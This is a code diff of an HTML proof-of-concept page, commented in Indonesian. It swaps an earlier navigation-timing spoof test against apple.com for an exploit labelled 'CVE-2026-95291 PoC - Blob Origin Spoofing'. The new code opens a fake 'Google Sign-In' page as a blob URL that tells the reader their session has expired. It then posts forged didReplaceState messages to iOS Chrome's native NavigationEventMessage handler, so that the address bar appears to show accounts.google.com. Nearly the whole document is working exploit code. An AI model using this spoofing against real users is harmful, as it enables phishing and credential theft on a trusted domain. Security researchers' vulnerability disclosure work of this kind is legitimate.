@@ -6,132 +6,116 @@
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
     />
-    <title>Navigation Method Variant PoC</title>
+    <title>CVE-2026-95291 PoC - Blob Origin Spoofing</title>
     <style>
       body, html {
         margin: 0;
         padding: 0;
         height: 100%;
-        background: #111;
+        background: #000;
         color: #fff;
-        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
         display: flex;
-        flex-direction: column;
         align-items: center;
         justify-content: center;
       }
       .container {
-        display: flex;
-        flex-direction: column;
-        gap: 15px;
-        width: 90%;
-        max-width: 420px;
+        text-align: center;
+        padding: 30px;
       }
       button {
-        padding: 16px 20px;
-        font-size: 16px;
+        padding: 20px 40px;
+        font-size: 18px;
         font-weight: bold;
+        background: #007aff;
         color: #fff;
         border: none;
-        border-radius: 10px;
+        border-radius: 12px;
         cursor: pointer;
-        box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+        box-shadow: 0 4px 15px rgba(0, 122, 255, 0.4);
       }
-      .btn-replace { background: #007aff; }
-      .btn-assign { background: #34c759; }
-      .btn-self { background: #ff9500; }
-      .btn-location { background: #af52de; }
     </style>
   </head>
   <body>
-
     <div class="container">
-      <h2 style="text-align:center; font-size:18px; margin-bottom:10px;">Variasi Metode Navigasi Tab Baru</h2>
-      
-      <!-- 1. Menggunakan location.replace() -->
-      <button class="btn-replace" id="btnReplace">1. location.replace()</button>
-
-      <!-- 2. Menggunakan location.assign() -->
-      <button class="btn-assign" id="btnAssign">2. location.assign()</button>
-
-      <!-- 3. Menggunakan properti self / top assignment -->
-      <button class="btn-self" id="btnSelf">3. self.locations / top.location</button>
-
-      <!-- 4. Penugasan langsung objek location -->
-      <button class="btn-location" id="btnLocationObj">4. window.location = URL</button>
+      <button id="exploitBtn">JALANKAN BLOB SPOOFING PoC</button>
     </div>
 
     <script>
-      const payloadHTML = `
-        <!DOCTYPE html>
-        <html>
-        <head><title>Apple - Security Test</title></head>
-        <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
-          <div>
-            <h1 style="font-size:36px;color:#1d1d1f;margin-bottom:10px;"> Security Validation</h1>
-            <p style="font-size:16px;color:#86868b;">Menguji variasi metode navigasi asinkron.</p>
-          </div>
-        </body>
-        </html>
-      `;
+      document.getElementById("exploitBtn").onclick = async function () {
+        this.remove();
 
-      // Fungsi generik untuk mengeksekusi tab baru + beban thread CPU
-      function runTest(navigationCallback) {
-        const newTab = window.open("about:blank", "_blank");
+        // 1. Membuat payload HTML attacker untuk dokumen blob
+        const attackerHtml = `
+          <!DOCTYPE html>
+          <html>
+          <head>
+            <meta charset="utf-8">
+            <title>Accounts - Google Sign In</title>
+          </head>
+          <body style="margin:0;padding:0;background:#ffffff;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
+            <div style="padding: 30px; max-width: 500px;">
+              <h1 style="font-size:32px;font-weight:800;color:#202124;margin:0 0 16px 0;">Google Sign-In</h1>
+              <p style="font-size:16px;color:#5f6368;margin:0 0 24px 0;">Sesi Anda telah kedaluwarsa. Silakan verifikasi identitas Anda.</p>
+              <div style="border: 1px solid #dadce0; padding: 20px; border-radius: 8px; background: #f8f9fa;">
+                <p style="font-size:14px; color:#c5221f; font-weight:600; margin:0;">[Simulasi Spoofed Content Kontrol Penyerang]</p>
+              </div>
+            </div>
+          </body>
+          </html>
+        `;
 
-        if (newTab) {
-          newTab.document.write(payloadHTML);
-          newTab.document.close();
+        // 2. Mengubah payload menjadi Blob URL lokal
+        const blob = new Blob([attackerHtml], { type: 'text/html' });
+        const blobUrl = URL.createObjectURL(blob);
 
-          // Pemicu navigasi dengan metode spesifik
-          setTimeout(() => {
+        // 3. Membuka tab baru yang mengarah ke blob URL lokal
+        const targetTab = window.open(blobUrl, "_blank");
+
+        if (targetTab) {
+          // Fungsi eksekusi forged message untuk memicu spoofing via NavigationEventMessage
+          const triggerSpoof = () => {
             try {
-              navigationCallback(newTab);
-            } catch (e) {
-              console.error("Navigation error:", e);
-            }
-          }, 5);
+              // Membaca frameId dari lingkungan page-world gCrWeb
+              if (targetTab.window.__gCrWeb && typeof targetTab.window.__gCrWeb.getFrameId === 'function') {
+                const frameId = targetTab.window.__gCrWeb.getFrameId();
+                
+                // Mendaftarkan frame secara manual jika diperlukan
+                if (typeof targetTab.window.__gCrWeb.registerFrame === 'function') {
+                  targetTab.window.__gCrWeb.registerFrame();
+                }
 
-          // Beban CPU sinkron (Busy-Wait) untuk menguji respons thread utama
-          setTimeout(() => {
-            try {
-              const start = Date.now();
-              while (Date.now() - start < 3000) {
-                newTab.Math.random();
+                // Mengirimkan pesan forged didReplaceState langsung ke handler native iOS Chrome
+                if (targetTab.window.webkit && targetTab.window.webkit.messageHandlers && targetTab.window.webkit.messageHandlers.NavigationEventMessage) {
+                  
+                  // Mengirim willChangeState terlebih dahulu untuk memenuhi syarat internal dcheck/state
+                  targetTab.window.webkit.messageHandlers.NavigationEventMessage.postMessage({
+                    command: "willChangeState",
+                    frame_id: frameId
+                  });
+
+                  // Mengirim didReplaceState dengan memalsukan pageUrl ke target domain tepercaya (misal: accounts.google.com)
+                  targetTab.window.webkit.messageHandlers.NavigationEventMessage.postMessage({
+                    command: "didReplaceState",
+                    pageUrl: "blob:https://accounts.google.com/signin",
+                    baseUrl: "https://x/",
+                    stateObject: "",
+                    frame_id: frameId
+                  });
+                  
+                  console.log("Forged navigation message dispatched successfully.");
+                }
               }
-            } catch (e) {
-              console.error("Thread block error:", e);
+            } catch (err) {
+              console.error("Exploit dispatch error:", err);
             }
-          }, 40);
+          };
+
+          // Retry timing untuk mengatasi race condition registrasi frame di DOM parsing awal
+          setTimeout(triggerSpoof, 150);
+          setTimeout(triggerSpoof, 500);
+          setTimeout(triggerSpoof, 1200);
         }
-      }
-
-      // 1. location.replace()
-      document.getElementById("btnReplace").onclick = function () {
-        runTest((win) => {
-          win.location.replace("https://apple.com:90");
-        });
-      };
-
-      // 2. location.assign()
-      document.getElementById("btnAssign").onclick = function () {
-        runTest((win) => {
-          win.location.assign("https://apple.com:90");
-        });
-      };
-
-      // 3. self.location / top.location
-      document.getElementById("btnSelf").onclick = function () {
-        runTest((win) => {
-          win.self.location = "https://apple.com:90";
-        });
-      };
-
-      // 4. Penugasan langsung window.location
-      document.getElementById("btnLocationObj").onclick = function () {
-        runTest((win) => {
-          win.window.location = "https://apple.com:90";
-        });
       };
     </script>
   </body>
